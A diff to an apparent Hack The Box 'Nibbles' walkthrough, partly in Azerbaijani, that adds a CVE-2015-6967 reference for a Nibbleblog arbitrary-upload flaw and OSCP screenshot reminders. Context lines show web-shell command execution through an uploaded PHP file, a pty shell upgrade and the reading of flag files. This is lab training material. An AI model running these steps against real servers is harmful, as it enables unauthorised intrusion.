@@ -164,10 +164,17 @@ file cmd.php
 
 Yükləmədən sonra:
 
+**CVE-2015-6967** (NVD: https://nvd.nist.gov/vuln/detail/CVE-2015-6967)
+
+Nibbleblog 4.0.3 - My Image plugin: arbitrary file upload (no extension/MIME validation).
+
 ```
 http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?ipp=whoami
 # GIF8; nibbler nibbler
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 ### Reverse Shell
 
@@ -192,6 +199,9 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```bash
 cat /home/nibbler/user.txt
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 ---
 
@@ -222,6 +232,9 @@ Root shell əldə edirik. Bayrağı oxuyuruq:
 ```bash
 cat /root/root.txt
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 ---
 
